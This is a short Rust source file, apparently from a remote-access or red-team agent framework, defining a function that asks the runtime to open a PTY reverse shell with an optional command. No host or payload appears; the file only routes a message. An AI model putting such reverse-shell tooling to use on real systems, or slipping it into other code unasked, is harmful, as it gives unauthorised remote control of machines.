use crate::runtime::{
    messages::{AsyncMessage, ReverseShellPTYMessage},
    Environment,
};
use anyhow::Result;

pub fn reverse_shell_pty(env: &Environment, cmd: Option<String>) -> Result<()> {
    env.send(AsyncMessage::from(ReverseShellPTYMessage {
        id: env.id(),
        cmd,
    }))?;
    Ok(())
}
